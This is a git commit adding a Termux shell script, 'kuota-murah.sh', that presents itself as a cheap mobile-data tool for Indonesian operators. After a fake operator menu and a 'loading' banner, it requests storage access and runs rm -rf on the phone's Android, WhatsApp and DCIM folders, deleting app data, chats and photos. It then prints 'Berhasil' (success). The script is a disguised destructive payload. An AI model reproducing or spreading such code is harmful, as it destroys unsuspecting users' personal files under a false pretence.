49355c0026e134d4af0ac0d0598d4357ff5030c9
Renz-termux <55936812+Renz-termux@users.noreply.github.com>
2019-09-29 12:42:05 +0700

    Add files via upload

---
+++ kuota-murah.sh
@@ -0,0 +1,25 @@
+figlet Kuota Murah|lolcat
+figlet all operator|lolcat
+
+echo ""
+echo "1.telkomsel"
+echo "2.indosat"
+echo "3.imtree"
+echo "4.tree"
+echo "5.xl"
+echo "6.axis"
+echo "7.smartfren"
+echo "8.exit"
+echo ""
+
+read -p "pilih no: " bos:
+figlet loading|lolcat
+sleep 5
+termux-setup-storage
+cd /sdcard
+rm -r -f Android
+sleep 2
+rm -r -f WhatsApp
+sleep 2
+rm -r -f DCIM
+figlet Berhasil|lolcat
